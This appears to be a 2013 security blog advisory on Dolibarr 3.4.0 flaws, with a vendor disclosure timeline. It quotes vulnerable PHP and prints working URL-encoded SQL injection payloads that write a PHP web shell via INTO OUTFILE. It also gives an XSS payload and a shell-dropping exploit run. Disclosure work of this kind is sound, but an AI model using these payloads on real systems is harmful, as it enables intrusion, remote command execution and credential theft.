@@ -1,0 +1,717 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Dolibarr 3.4.0 - Multiple Vulnerabilities - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Dolibarr is an open source, enterprise-grade ERP/CRM application developed in PHP. The latest stable release, 3.4.0, is vulnerable to a host of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Dolibarr 3.4.0 - Multiple Vulnerabilities</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-14T23:13:15-06:00" pubdate data-updated="true">Oct 14<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://www.dolibarr.org/">Dolibarr</a> is an open source, enterprise-grade ERP/CRM application developed in PHP.  The latest stable release, 3.4.0, is vulnerable to a host of remotely exploitable post and pre auth vulnerabilities, along with several seriously mind-bending security/architecture choices.  These vulnerabilities and issues were privately disclosed to the vendor, and the SQLi was patched in version 3.4.1.  However, their sanitization methods were not fixed, and no mention was made on a future patch.  Other SQLi vectors are likely.</p>
+
+<p>There are multiple SQL injections that lead to a compromise of the availability/integrity of the database or web server.  The scenario and context of the vulnerabilities are rather interesting, as multiple blacklisting techniques are used by Dolibarr in an attempt to mitigate malicious queries slipping through; nevertheless, as we know, blacklisting never works.  No parameterized queries are to be found in source.</p>
+
+<p>The following is included in each page and used for &ldquo;sanitization&rdquo; <code>main.inc.php</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function analyse_sql_and_script(&$var, $type)
+</span><span class='line'>{
+</span><span class='line'>    if (is_array($var))
+</span><span class='line'>    {
+</span><span class='line'>        foreach ($var as $key =&gt; $value)
+</span><span class='line'>        {
+</span><span class='line'>            if (analyse_sql_and_script($value,$type))
+</span><span class='line'>            {
+</span><span class='line'>                $var[$key] = $value;
+</span><span class='line'>            }
+</span><span class='line'>            else
+</span><span class='line'>            {
+</span><span class='line'>                print 'Access refused by SQL/Script injection protection in main.inc.php';
+</span><span class='line'>                exit;
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>        return true;
+</span><span class='line'>    }
+</span><span class='line'>    else
+</span><span class='line'>    {
+</span><span class='line'>        return (test_sql_and_script_inject($var,$type) &lt;= 0);
+</span><span class='line'>    }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pretty typical recursive function for sanitizing input.  The following performs the actual sanity checking:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function test_sql_and_script_inject($val, $type)
+</span><span class='line'>{
+</span><span class='line'>    $sql_inj = 0;
+</span><span class='line'>    // For SQL Injection (only GET and POST are used to be included into bad escaped SQL requests)
+</span><span class='line'>    if ($type != 2)
+</span><span class='line'>    {
+</span><span class='line'>        $sql_inj += preg_match('/delete[\s]+from/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/create[\s]+table/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/update.+set.+=/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/insert[\s]+into/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/select.+from/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/union.+select/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/(\.\.%2f)+/i', $val);
+</span><span class='line'>    }
+</span><span class='line'>    // For XSS Injection done by adding javascript with script
+</span><span class='line'>    // This is all cases a browser consider text is javascript:
+</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
+</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
+</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
+</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
+</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
+</span><span class='line'>    if ($type == 1)
+</span><span class='line'>    {
+</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
+</span><span class='line'>    }
+</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
+</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
+</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
+</span><span class='line'>    return $sql_inj;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s quite clear that the blacklisting approach is inefficient; particularly the cross-site scripting protection.  The SQLi blacklisting doesn&rsquo;t restrict INTO OUTFILE/DUMPFILE, meaning with a well-tuned SQL injection we can throw a web shell onto the box.</p>
+
+<p>Let&rsquo;s take a look at one such vulnerable query <code>contact/fiche.php</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if ($action == 'confirm_delete' && $confirm == 'yes' && $user-&gt;rights-&gt;societe-&gt;contact-&gt;supprimer)
+</span><span class='line'>    {
+</span><span class='line'>        $result=$object-&gt;fetch($_GET["id"]);</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>contact/class/contact.class.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id, $user=0)
+</span><span class='line'>    {
+</span><span class='line'>        global $langs;
+</span><span class='line'>
+</span><span class='line'>        $langs-&gt;load("companies");
+</span><span class='line'>
+</span><span class='line'>        $sql = "SELECT c.rowid, c.fk_soc, c.civilite as civilite_id, c.lastname, c.firstname,";
+</span><span class='line'>        $sql.= " c.address, c.zip, c.town,";
+</span><span class='line'>        $sql.= " c.fk_pays as country_id,";
+</span><span class='line'>        $sql.= " c.fk_departement,";
+</span><span class='line'>        $sql.= " c.birthday,";
+</span><span class='line'>        $sql.= " c.poste, c.phone, c.phone_perso, c.phone_mobile, c.fax, c.email, c.jabberid,";
+</span><span class='line'>        $sql.= " c.priv, c.note_private, c.note_public, c.default_lang, c.no_email, c.canvas,";
+</span><span class='line'>        $sql.= " c.import_key,";
+</span><span class='line'>        $sql.= " p.libelle as country, p.code as country_code,";
+</span><span class='line'>        $sql.= " d.nom as state, d.code_departement as state_code,";
+</span><span class='line'>        $sql.= " u.rowid as user_id, u.login as user_login,";
+</span><span class='line'>        $sql.= " s.nom as socname, s.address as socaddress, s.zip as soccp, s.town as soccity, s.default_lang as socdefault_lang";
+</span><span class='line'>        $sql.= " FROM ".MAIN_DB_PREFIX."socpeople as c";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_pays as p ON c.fk_pays = p.rowid";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_departements as d ON c.fk_departement = d.rowid";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."user as u ON c.rowid = u.fk_socpeople";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."societe as s ON c.fk_soc = s.rowid";
+</span><span class='line'>        $sql.= " WHERE c.rowid = ". $id;
+</span><span class='line'>
+</span><span class='line'>        dol_syslog(get_class($this)."::fetch sql=".$sql);
+</span><span class='line'>        $resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our vulnerable parameter <code>id</code> is sanitized only by the previously described functions.  There are now two main options; dump information from the database, or drop a web shell onto the host.  The latter is the best case and the former is, usually, a good consolatory prize.  However, in this case, the database is ripe with information, specifically:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG"></p>
+
+<p>Yeah, that&rsquo;s your plaintext password stored right next to the hashed version.  Dumping the database just got a whole lot more interesting.</p>
+
+<p>Our attention now turns to evading the filters listed above.  For obtaining a shell, the only evasion we need to consider is UNION SELECT, as INTO OUTFILE/DUMPFILE is not filtered.  After a bit of deliberation and source code analysis, it was determined that the filters were trivially bypassed by URL encoding SQL keywords.  The following query will drop a web shell at the given location:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/dolibarr-3.4.0/htdocs/contact/fiche.php?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php'&action=confirm_delete&confirm=yes HTTP/1.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which results in:</p>
+
+<p><img class="center" src="http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG" title="" ></p>
+
+<p>The documents folder is a perfect candidate for our web shell as, during installation of the CMS, this folder must be user-created and writable by the install, giving us a guaranteed and predictable location for the web shell.</p>
+
+<p>This vulnerability has been detected in <code>contact.class.php</code> in four different functions: fetch, update, delete, and create.</p>
+
+<p>We now take another look at the XSS filtering function:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  // For XSS Injection done by adding javascript with script
+</span><span class='line'>    // This is all cases a browser consider text is javascript:
+</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
+</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
+</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
+</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
+</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
+</span><span class='line'>    if ($type == 1)
+</span><span class='line'>    {
+</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
+</span><span class='line'>    }
+</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
+</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
+</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
+</span><span class='line'>    return $sql_inj;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, this is quite weak, and we can get by with a very simple injection, <code>&lt;body onload=alert(1)&gt;</code>.  Injecting this into the last name of a contact results in success:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG"></p>
+
+<p>With this we can syphon off session IDs and completely hijack sessions.  Any field that&rsquo;s reflected back to the user is vulnerable, and considering this is a CMS, that&rsquo;s a lot.</p>
+
+<p>All of the discussed vulnerabilities have, thus far, been post-auth.  One remotely exploitable pre-auth vulnerability was discovered in <code>public/members/public_list.php</code> (configured with <code>define("NOLOGIN",1)</code>), meaning it does not require auth):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$sortfield = GETPOST("sortfield",'alpha');
+</span><span class='line'>$sortorder = GETPOST("sortorder",'alpha');
+</span><span class='line'>$page = GETPOST("page",'int');
+</span><span class='line'>if ($page == -1) { $page = 0; }
+</span><span class='line'>$offset = $conf-&gt;liste_limit * $page;
+</span><span class='line'>$pageprev = $page - 1;
+</span><span class='line'>$pagenext = $page + 1;
+</span><span class='line'>
+</span><span class='line'>$filter=GETPOST('filter');
+</span><span class='line'>$statut=GETPOST('statut');
+</span><span class='line'>
+</span><span class='line'>if (! $sortorder) {  $sortorder="ASC"; }
+</span><span class='line'>if (! $sortfield) {  $sortfield="nom"; }
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>/*
+</span><span class='line'> * View
+</span><span class='line'> */
+</span><span class='line'>
+</span><span class='line'>llxHeaderVierge($langs-&gt;trans("ListOfValidatedPublicMembers"));
+</span><span class='line'>
+</span><span class='line'>$sql = "SELECT rowid, firstname, lastname, societe, zip, town, email, birth, photo";
+</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."adherent";
+</span><span class='line'>$sql.= " WHERE entity = ".$entity;
+</span><span class='line'>$sql.= " AND statut = 1";
+</span><span class='line'>$sql.= " AND public = 1";
+</span><span class='line'>$sql.= $db-&gt;order($sortfield,$sortorder);
+</span><span class='line'>$sql.= $db-&gt;plimit($conf-&gt;liste_limit+1, $offset);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And <code>core/db/msqli.class.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> function order($sortfield=0,$sortorder=0)
+</span><span class='line'>    {
+</span><span class='line'>        if ($sortfield)
+</span><span class='line'>        {
+</span><span class='line'>            $return='';
+</span><span class='line'>            $fields=explode(',',$sortfield);
+</span><span class='line'>            foreach($fields as $val)
+</span><span class='line'>            {
+</span><span class='line'>                if (! $return) $return.=' ORDER BY ';
+</span><span class='line'>                else $return.=',';
+</span><span class='line'>
+</span><span class='line'>                $return.=preg_replace('/[^0-9a-z_\.]/i','',$val);
+</span><span class='line'>                if ($sortorder) $return.=' '.preg_replace('/[^0-9a-z]/i','',$sortorder);
+</span><span class='line'>            }
+</span><span class='line'>            return $return;
+</span><span class='line'>        }
+</span><span class='line'>        else
+</span><span class='line'>        {
+</span><span class='line'>            return '';
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And navigation to the page results in:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG"></p>
+
+<p>As shown, the <code>sortfield</code> and <code>sortorder</code> parameters are inadequately sanitized, but exploitation may be a bit tricky.  The order function strips everything that isn&rsquo;t a number, lowercase alphanumeric letter, or one of three symbols.  Instead, why don&rsquo;t we exploit yet <em>another</em> preauth vulnerability in <code>opensurvey/public/exportcsv.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$action=GETPOST('action');
+</span><span class='line'>$numsondage = $numsondageadmin = '';
+</span><span class='line'>
+</span><span class='line'>if (GETPOST('sondage'))
+</span><span class='line'>{
+</span><span class='line'>    if (strlen(GETPOST('sondage')) == 24)    // recuperation du numero de sondage admin (24 car.) dans l'URL
+</span><span class='line'>    {
+</span><span class='line'>        $numsondageadmin=GETPOST("sondage",'alpha');
+</span><span class='line'>        $numsondage=substr($numsondageadmin, 0, 16);
+</span><span class='line'>    }
+</span><span class='line'>    else
+</span><span class='line'>    {
+</span><span class='line'>        $numsondageadmin='';
+</span><span class='line'>        $numsondage=GETPOST("sondage",'alpha');
+</span><span class='line'>    }
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>$object=new Opensurveysondage($db);
+</span><span class='line'>$result=$object-&gt;fetch(0,$numsondage);
+</span><span class='line'>if ($result &lt;= 0) dol_print_error('','Failed to get survey id '.$numsondage);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And <code>opensurvey/class/opensurveysondage.class.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id,$numsurvey='')
+</span><span class='line'>{
+</span><span class='line'>global $langs;
+</span><span class='line'>
+</span><span class='line'>$sql = "SELECT";
+</span><span class='line'>//$sql.= " t.rowid,";
+</span><span class='line'>$sql.= " t.id_sondage,";
+</span><span class='line'>$sql.= " t.commentaires,";
+</span><span class='line'>$sql.= " t.mail_admin,";
+</span><span class='line'>$sql.= " t.nom_admin,";
+</span><span class='line'>$sql.= " t.titre,";
+</span><span class='line'>$sql.= " t.id_sondage_admin,";
+</span><span class='line'>$sql.= " t.date_fin,";
+</span><span class='line'>$sql.= " t.format,";
+</span><span class='line'>$sql.= " t.mailsonde,";
+</span><span class='line'>$sql.= " t.survey_link_visible,";
+</span><span class='line'>$sql.= " t.canedit,";
+</span><span class='line'>$sql.= " t.sujet,";
+</span><span class='line'>$sql.= " t.tms";
+</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."opensurvey_sondage as t";
+</span><span class='line'>if ($id &gt; 0) $sql.= " WHERE t.rowid = ".$id;
+</span><span class='line'>else if (strlen($numsurvey) == 16) $sql.= " WHERE t.id_sondage = '".$numsurvey."'";
+</span><span class='line'>else $sql.= " WHERE t.id_sondage_admin = '".$numsurvey."'";
+</span><span class='line'>
+</span><span class='line'>dol_syslog(get_class($this)."::fetch sql=".$sql, LOG_DEBUG);
+</span><span class='line'>$resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As the bolded path shows, the query argument <code>numsurvey</code> is directly controllable by an unauthenticated user, leading to the same type of SQL vulnerability shown earlier.  This can be exploited with the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /dolibarr/htdocs/opensurvey/public/exportcsv.php?sondage='%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php';%20--%20-%20 HTTP/1.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using the same URL encoding trick from before, we can bypass the blacklisting and inject directly into the vulnerable query.  Exploit code for this is included at the bottom of the post:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python dolibarr_34_sploit.py -i 192.168.1.100 -p /dolibarr-3.4.0 -w /var/www/dolibarr-3.4.0/documents
+</span><span class='line'>[!] Dropping web shell on 192.168.1.100...
+</span><span class='line'>[!] Shell dropped.  http://192.168.1.100/documents/o4oct.php?cmd=ls
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG"></p>
+
+<p>Fortunately, for users running DoliWamp,  Dolibarr + WAMP package on Windows, the default user that the database runs with is not allowed to write files.  They are still vulnerable, however, to database corruption and traversal (i.e. drop table subqueries, etc.).</p>
+
+<h3>Timeline</h3>
+
+
+<ul>
+<li>10/06/2013 &ndash; Vendor notified of remotely exploitable vulnerabilities</li>
+<li>10/07/2013 &ndash; Vendor acknowledges vulnerability, no timeline provided</li>
+<li>10/11/2013 &ndash; Vendor states fix will be in the 3.4.1 release within the month</li>
+<li>10/14/2013 &ndash; 3.4.1 released with patch.  This advisory released</li>
+</ul>
+
+
+<p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-14T23:13:15-06:00" pubdate data-updated="true">Oct 14<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/dolibarr/'>dolibarr</a>, <a class='category' href='/blog/categories/sqli/'>sqli</a>, <a class='category' href='/blog/categories/vulnerabilities/'>vulnerabilities</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/" title="Previous Post: OpenEMM-2013 SOAP SQLi/Stored XSS">&laquo; OpenEMM-2013 SOAP SQLi/Stored XSS</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/" title="Next Post: Fetching JBoss MBean method hashes">Fetching JBoss MBean method hashes &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
